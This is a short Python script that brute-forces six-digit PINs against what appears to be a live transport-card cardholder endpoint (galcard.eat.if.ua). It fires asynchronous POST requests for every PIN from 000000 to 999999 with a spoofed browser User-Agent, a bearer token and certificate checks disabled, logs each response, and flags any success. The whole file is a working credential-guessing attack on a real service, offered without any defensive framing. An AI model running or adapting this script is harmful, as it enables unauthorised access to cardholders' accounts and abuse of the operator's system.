import grequests
import time
from colorama import init, Fore, Back, Style
from dotenv import load_dotenv
import os
load_dotenv()
init()




HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "uk,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
    "Authorization": f"Bearer {os.getenv("API_KEY")}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0"
}

EAT = "https://galcard.eat.if.ua/cardholder/transport/cards"



def main():
    resps_p = set()
    for j in range(999):
        for i in range(1000*j, (j+1)*1000):
            i_str = str(i)
            while len(i_str) != 6:
                i_str = "0" + i_str
            
            promise = grequests.post(EAT, headers=HEADERS, json={"sysNum": "000000000", "name": "q", "pin": i_str}, verify=False)
            # print(promise)
            resps_p.add(promise)
        with open("reqs.txt", "a") as file:
            for index, response in grequests.imap_enumerated(resps_p, size=4):
                try:
                    file.write(f"{index} {response.status_code} {response.text} {response.request.body.decode('utf-8')}\n\n~~yy34!")
                except Exception as E:
                    print("Ur idiot", E)
                print(index, response.status_code)
                if response.status_code == 200:
                    print(Fore.GREEN, index, f"{index} {response.status_code} {response.text} {response.request.body.decode('utf-8')}\n\n~~yy34!")
                    time.sleep(10)


        



if __name__ == "__main__":
    main()

